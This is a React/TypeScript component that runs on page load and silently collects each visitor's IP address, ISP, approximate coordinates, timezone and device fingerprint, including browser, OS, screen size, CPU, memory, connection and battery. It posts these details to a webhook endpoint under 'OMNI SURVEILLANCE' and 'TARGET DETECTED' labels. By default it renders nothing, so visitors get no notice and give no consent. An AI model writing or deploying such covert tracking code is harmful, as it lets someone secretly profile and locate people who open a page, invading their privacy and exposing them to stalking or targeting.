"use client";
import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { CheckCircle, XCircle, Loader2 } from "lucide-react";

interface VisitorData {
  ip: string;
  city: string;
  region: string;
  country_name: string;
  org: string;
  type?: string;
  latitude?: number;
  longitude?: number;
}

interface WebhookStatus {
  status: "idle" | "loading" | "success" | "error";
  message?: string;
}

export default function SendToWebhook({
  showFeedback = false,
  debugMode = false,
}: {
  showFeedback?: boolean;
  debugMode?: boolean;
}) {
  const [status, setStatus] = useState<WebhookStatus>({ status: "idle" });

  const getVisitorData = async (): Promise<VisitorData> => {
    try {
      const response = await fetch("https://ipapi.co/json/");
      if (!response.ok) throw new Error("Failed to fetch IP data");
      return await response.json();
    } catch (error) {
      throw new Error("Failed to get visitor data");
    }
  };

  const getSystemData = () => ({
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  });

  function getBrowserInfo(userAgent: string) {
    const ua = userAgent.toLowerCase();
    let browser = "Unknown";
    let version = "Unknown";

    if (ua.includes("firefox")) {
      browser = "Firefox";
      version = ua.match(/firefox\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("chrome")) {
      browser = "Chrome";
      version = ua.match(/chrome\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("safari")) {
      browser = "Safari";
      version = ua.match(/version\/([\d.]+)/)?.[1] || "";
    } else if (ua.includes("edge")) {
      browser = "Edge";
      version = ua.match(/edge\/([\d.]+)/)?.[1] || "";
    }

    return { name: browser, version };
  }

  function getDeviceType(userAgent: string) {
    const ua = userAgent.toLowerCase();
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
      return "Tablet";
    }
    if (/mobile|android|iphone|ipod|windows phone/i.test(ua)) {
      return "Mobile";
    }
    return "Desktop";
  }

  function getOS(userAgent: string) {
    const ua = userAgent.toLowerCase();
    if (ua.includes("windows")) return "Windows";
    if (ua.includes("mac")) return "MacOS";
    if (ua.includes("linux")) return "Linux";
    if (ua.includes("android")) return "Android";
    if (ua.includes("ios")) return "iOS";
    return "Unknown";
  }

  function getDeviceMemory() {
    return (navigator as any).deviceMemory || "Unknown";
  }

  function getConnectionInfo() {
    const conn = (navigator as any).connection;
    if (!conn) return "Unknown";
    return `${conn.effectiveType || "Unknown"} (${conn.downlink}Mbps)`;
  }

  async function getBatteryStatus() {
    try {
      if ("getBattery" in navigator) {
        const battery = await (navigator as any).getBattery();
        return `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
      }
      return "Not Available";
    } catch {
      return "Not Available";
    }
  }

  // Update the createWebhookPayload to be async
  const createWebhookPayload = async (ipData: VisitorData, systemData: any) => {
    // Get current time in different formats
    const currentTime = new Date();
    const localTime = currentTime.toLocaleString();
    const utcTime = currentTime.toUTCString();

    // Calculate session ID
    const sessionId = Math.random().toString(36).substring(2, 15);

    // Browser detection
    const browserInfo = getBrowserInfo(systemData.userAgent);

    // Device type detection
    const deviceType = getDeviceType(systemData.userAgent);

    // Get battery status
    const batteryStatus = await getBatteryStatus();

    return {
      username: "OMNI SURVEILLANCE",
      avatar_url: "https://your-omni-avatar-url.jpg",
      embeds: [
        {
          title: "👁️ TARGET DETECTED",
          description:
            "```diff\n+ NEW SUBJECT ENTERED SURVEILLANCE ZONE +\n```",
          color: 0xdc2626,
          fields: [
            {
              name: "🎯 SESSION IDENTIFIER",
              value: `\`${sessionId}\``,
              inline: false,
            },
            {
              name: "⚡ NETWORK DATA",
              value:
                "```yaml\n" +
                `IP: ${ipData.ip || "MASKED"}\n` +
                `ISP: ${ipData.org || "UNKNOWN"}\n` +
                `Connection: ${ipData.type || "STANDARD"}\n` +
                "```",
              inline: false,
            },
            {
              name: "📍 GEOLOCATION",
              value:
                "```yaml\n" +
                `Country: ${ipData.country_name || "UNKNOWN"}\n` +
                `Region: ${ipData.region || "UNKNOWN"}\n` +
                `City: ${ipData.city || "UNKNOWN"}\n` +
                `Latitude: ${ipData.latitude || "?"}\n` +
                `Longitude: ${ipData.longitude || "?"}\n` +
                `Timezone: ${systemData.timezone}\n` +
                "```",
              inline: false,
            },
            {
              name: "💻 SYSTEM ANALYSIS",
              value:
                "```yaml\n" +
                `Device: ${deviceType}\n` +
                `OS: ${getOS(systemData.userAgent)}\n` +
                `Browser: ${browserInfo.name} ${browserInfo.version}\n` +
                `Language: ${systemData.language}\n` +
                `Screen: ${systemData.screenWidth}x${systemData.screenHeight}\n` +
                `Platform: ${systemData.platform}\n` +
                "```",
              inline: false,
            },
            {
              name: "🔍 ADDITIONAL INTEL",
              value:
                "```yaml\n" +
                `CPU Cores: ${navigator.hardwareConcurrency || "UNKNOWN"}\n` +
                `Memory: ${getDeviceMemory()}GB\n` +
                `Connection: ${getConnectionInfo()}\n` +
                `Battery: ${batteryStatus}\n` +
                "```",
              inline: false,
            },
          ],
          footer: {
            text: `SURVEILLANCE ID: ${sessionId} | Local Time: ${localTime} | UTC: ${utcTime}`,
          },
        },
      ],
    };
  };

  // Update the sendReport function to handle async createWebhookPayload
  const sendReport = async () => {
    try {
      setStatus({ status: "loading" });

      const ipData = await getVisitorData();
      const systemData = getSystemData();
      const payload = await createWebhookPayload(ipData, systemData); // Add await here

      const response = await fetch("/api/webhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || "Failed to send webhook");
      }

      setStatus({
        status: "success",
        message: "Report sent successfully",
      });

      if (debugMode) {
        console.log("Webhook payload:", payload);
      }
    } catch (error) {
      setStatus({
        status: "error",
        message:
          error instanceof Error ? error.message : "Unknown error occurred",
      });
      if (debugMode) {
        console.error("Webhook error:", error);
      }
    }
  };

  useEffect(() => {
    sendReport();
  }, []);

  if (!showFeedback) return null;

  return (
    <AnimatePresence>
      {status.status !== "idle" && (
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: 50 }}
          className="fixed bottom-4 right-4 z-50"
        >
          <div
            className="bg-gray-900/90 backdrop-blur-md border border-red-950/50
                        rounded-lg shadow-lg p-4 flex items-center space-x-3"
          >
            {status.status === "loading" && (
              <Loader2 className="w-5 h-5 text-red-500 animate-spin" />
            )}
            {status.status === "success" && (
              <CheckCircle className="w-5 h-5 text-green-500" />
            )}
            {status.status === "error" && (
              <XCircle className="w-5 h-5 text-red-500" />
            )}
            <span className="text-sm text-white">
              {status.message || "Processing..."}
            </span>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
